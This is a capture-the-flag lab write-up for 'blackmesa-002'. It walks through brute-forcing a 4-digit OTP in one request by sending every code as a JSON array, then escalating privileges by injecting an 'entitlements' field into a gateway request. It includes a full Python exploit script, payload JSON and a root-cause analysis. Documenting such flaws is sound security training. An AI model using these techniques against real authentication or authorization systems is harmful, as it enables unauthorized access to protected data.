# blackmesa-002 - BugForge

**Difficulty:** Hard
**Vulnerability:** OTP rate-limit bypass via array batching -> gateway entitlements merge-order privilege escalation
**Flag:** `bug{ZUuNSZFr5FgxcR55oExleWmm8ZOM335C}`

---

## Summary

MesaNet Access Panel is a multi-app portal (mail, nexus notes, personnel, rail transit) sitting behind a session-based login and a gateway proxy for internal microservices. A hidden developer console at `/dev` is gated by a rotating 4-digit OTP with a 10-attempt lockout. The verify endpoint accepts the `otp` field as a JSON array and evaluates every element against the current code in a single request, while the lockout counter only decrements once per request - submitting the entire 10,000-value keyspace as one array clears the gate in a single shot. The dev console's user-provisioning endpoint then lets you create a deliberately low-privilege test account with narrow entitlements. Logging in as that account and calling the gateway with an extra, undocumented top-level `entitlements` field shows the backend merges the client body over the session's real entitlements rather than the other way around - the injected entitlements silently override the account's real ones, and a notes-listing call that should return two public notes instead returns every note plus the flag.

---

## App Structure

| Endpoint | Notes |
|----------|-------|
| `POST /login` | Form-based login (x-www-form-urlencoded) |
| `GET /` | Dashboard, links to mail/nexus/personnel/rail and `/dev` |
| `GET /dev` | Developer console, OTP-gated (4-digit, 60s rotation) |
| `GET /dev/time-remaining` | Returns `{"remaining": N}`, counts down from 60 |
| `POST /dev/verify` | OTP submission, `{"otp": "..."}` |
| `GET /dev/spec` | JSON schema for the provisioning payload |
| `GET /dev/examples` | Example provisioning payloads |
| `POST /api/dev/users` | Dev-console-only user provisioning |
| `POST /gateway` | Proxy to internal subsystems: `{id, endpoint, data}` |

Initial credentials (`operator:operator`) give full access to every app on the dashboard, including a direct link to `/dev`.

---

## Discovery

### Step 1 - The OTP gate

`/dev` redirects to a 4-digit, 60-second rotating OTP challenge. `POST /dev/verify` with a wrong string guess returns `Invalid one-time password. N attempt(s) remaining.` and decrements a 10-attempt budget down to a 60-second lockout. Re-authenticating with a brand new login mints a fresh session and resets the budget back to 10, confirming the lockout is session-scoped rather than account-scoped - a real bug on its own, but not enough alone to clear a 10,000-value keyspace inside one 60-second rotation.

### Step 2 - Array batching against the verify handler

Submitting the `otp` field as a JSON array instead of a string does not get rejected or type-checked - it produces the same generic "invalid" response as a wrong string guess. That is the signal worth pushing further: if the handler is iterating the array (`array.includes(currentCode)` or similar) rather than rejecting non-string input outright, then the array does not need to contain a good guess, it needs to contain every possible guess.

```json
{"otp": ["0000", "0001", ..., "9999"]}
```

All 10,000 four-digit codes fit in roughly 80KB of JSON, comfortably under the default body-size limit. Sent as a single `POST /dev/verify` with a fresh session, the response is `302 Found` to `/dev` - the entire keyspace was evaluated in one request, and the lockout counter (which only tracks requests, not array elements) never had a chance to engage.

### Step 3 - Reading the dev console documentation

`/dev` documents the gateway request shape and the provisioning endpoint, plus two extra JSON references: `/dev/spec` (a schema for the provisioning payload) and `/dev/examples` (sample payloads). The documented "Registered Applications" table lists placeholder UUIDs (`11111111-...`, `22222222-...`) for Nexus and Secure Mail - calling the gateway with those returns `{"error":"Unknown application ID"}`. The real per-app UUIDs are only found by reading each app page's own inline script (`APP_ID` constant), not the dev docs - a documentation/reality mismatch worth checking on any gateway-style app before assuming the docs are authoritative.

### Step 4 - Provisioning a deliberately low-privilege account

`POST /api/dev/users` accepts a schema of `username`, `password`, `fullName`, `clearanceLevel`, and an `entitlements` object per app (`nexus.read`/`nexus.write` arrays of classification levels, `mail.access`/`mail.canSend`/`mail.maxClassification`). Creating a test account with only public-level nexus read access and logging in as it confirms the restriction is real - `POST /gateway` against `/api/notes/list` returns exactly the two public notes, nothing restricted or confidential.

### Step 5 - Gateway entitlements merge-order injection

The gateway request shape is documented as `{"id": "<uuid>", "endpoint": "<path>", "data": {...}}`. Adding a fourth, undocumented top-level key to that same body - an `entitlements` object shaped like the one used at provisioning time - changes the response for the low-privilege account:

```json
{
  "id": "<real-nexus-app-uuid>",
  "endpoint": "/api/notes/list",
  "data": {},
  "entitlements": {
    "nexus": {
      "access": true,
      "read": ["public", "restricted", "confidential"],
      "write": ["public", "restricted", "confidential"]
    }
  }
}
```

The response now includes every note across all three classifications, plus a `flag` field the normal (correctly-scoped) response never contains. The gateway is building its authorization context by merging the session's real entitlements with the raw client body, in the order that lets the client body win - the low-privilege account's real, narrow entitlements never actually mattered once the request supplied its own.

---

## Exploit

```python
import json
import urllib.request

BASE = "https://<lab-host>"

def request(path, body=None, cookie=None, method=None):
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = f"connect.sid={cookie}"
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, headers=headers,
                                  method=method or ("POST" if data else "GET"))
    resp = urllib.request.urlopen(req)
    cookie_out = None
    for h in resp.headers.get_all("Set-Cookie") or []:
        if h.startswith("connect.sid="):
            cookie_out = h.split(";")[0].split("=", 1)[1]
    return resp, cookie_out

def login(username, password):
    req = urllib.request.Request(
        BASE + "/login",
        data=f"username={username}&password={password}".encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    resp = urllib.request.urlopen(req)
    for h in resp.headers.get_all("Set-Cookie") or []:
        if h.startswith("connect.sid="):
            return h.split(";")[0].split("=", 1)[1]

# 1. fresh session, OTP array-batch bypass
sid = login("operator", "operator")
codes = [f"{i:04d}" for i in range(10000)]
request("/dev/verify", {"otp": codes}, cookie=sid)

# 2. provision a deliberately low-privilege test user
request("/api/dev/users", {
    "username": "pentest_low", "password": "Pentest123!",
    "fullName": "Pentest Low Priv", "clearanceLevel": 0,
    "entitlements": {
        "nexus": {"access": True, "read": ["public"], "write": []},
        "mail": {"access": True, "canSend": False, "maxClassification": "public"}
    }
}, cookie=sid)

# 3. login as the low-priv user, inject entitlements at the gateway
sid2 = login("pentest_low", "Pentest123!")
nexus_app_id = "<real-nexus-uuid-from-app-page-source>"
resp, _ = request("/gateway", {
    "id": nexus_app_id,
    "endpoint": "/api/notes/list",
    "data": {},
    "entitlements": {
        "nexus": {"access": True,
                   "read": ["public", "restricted", "confidential"],
                   "write": ["public", "restricted", "confidential"]}
    }
}, cookie=sid2)

print(json.loads(resp.read())["flag"])
```

---

## Dead Ends

| Attempt | Why it failed |
|---------|--------------|
| Type-confusion payloads at `/dev/verify` (`{"otp":0}`, `{"otp":false}`, `{"otp":""}`, `{"otp":null}`, `{"otp":{"$ne":null}}`) | All return the same generic wrong-guess response with the attempt counter decremented; this app's verify handler does not have the falsy-loose-equality bug seen on a related instance |
| Single or few-element arrays (`{"otp":["1111"]}`) | Behaves like any other wrong guess - the array trick only pays off once it contains the actual current code, which means submitting the full keyspace, not a handful of guesses |
| Calling the gateway with the documented placeholder app UUIDs | `{"error":"Unknown application ID"}` - the dev docs list example/placeholder UUIDs, not the real ones used by the live app |
| IDOR on `/api/mail/get` for message IDs outside the current inbox | Correctly scoped - `"You can only read messages sent to you"` regardless of account privilege |

---

## Root Cause

Two independent flaws chain together. First, `/dev/verify` evaluates the `otp` field as a membership check against an array rather than requiring (or type-checking for) a single string, and the attempt-lockout counter only tracks HTTP requests rather than the number of candidate values inside one - so the entire keyspace can be tested in a single request at zero rate-limit cost. Second, the `/gateway` handler builds its per-request authorization context by spreading the session-derived entitlements and the raw client body together in the wrong order, so an attacker-supplied `entitlements` key in the body silently overrides the account's real, narrower entitlements. Neither bug depends on the other, but the first is what makes reaching the account-provisioning tooling needed to cleanly demonstrate the second trivial rather than requiring the initially-provided operator credentials to already have low privilege.

---

## CWE / OWASP

- **CWE-307**: Improper Restriction of Excessive Authentication Attempts (session-scoped lockout, and a lockout that counts requests rather than candidate values)
- **CWE-841**: Improper Enforcement of Behavioral Workflow (array-typed input accepted where a single credential value is expected)
- **CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object Attributes (client-supplied `entitlements` merged over server-derived authorization state)
- **CWE-863**: Incorrect Authorization
- **OWASP A07:2021** - Identification and Authentication Failures
- **OWASP A01:2021** - Broken Access Control
